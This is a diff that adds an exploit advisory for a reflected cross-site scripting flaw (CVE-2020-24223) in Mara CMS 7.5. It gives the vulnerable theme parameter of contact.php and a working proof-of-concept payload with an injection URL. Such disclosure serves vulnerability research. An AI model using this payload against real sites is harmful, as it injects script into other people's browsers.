@@ -1,0 +1,30 @@
+# Exploit Title: Mara CMS  7.5 - Reflective Cross-Site Scripting
+# Google Dork: NA
+# Date: 2020-08-01
+# Exploit Author: George Tsimpidas
+# Vendor Homepage: https://sourceforge.net/projects/maracms/
+# Software Link: https://sourceforge.net/projects/maracms/files/MaraCMS75.zip/download
+# Version: 7.5
+# Tested on: Kali Linux(x64)
+# CVE : CVE-2020-24223
+
+
+Mara CMS 7.5 suffers from a Reflected Cross Site Scripting vulnerability.
+
+Description :
+
+
+ This Reflected XSS vulnerability allows any authenticated user to
+inject malicious code via the parameter contact.php?theme=<inject>.
+The vulnerability exists because the parameter is not properly
+sanitized and this can lead to malicious code injection that will be
+executed on the target’s browser.
+
+PoC :
+
+Use Payload : seven69387';alert(1)//154
+
+Path : http://localhost/contact.php?theme=< inject payload here>
+
+Injection Example :
+http://localhost/contact.php?theme=seven69387';alert(1)//154
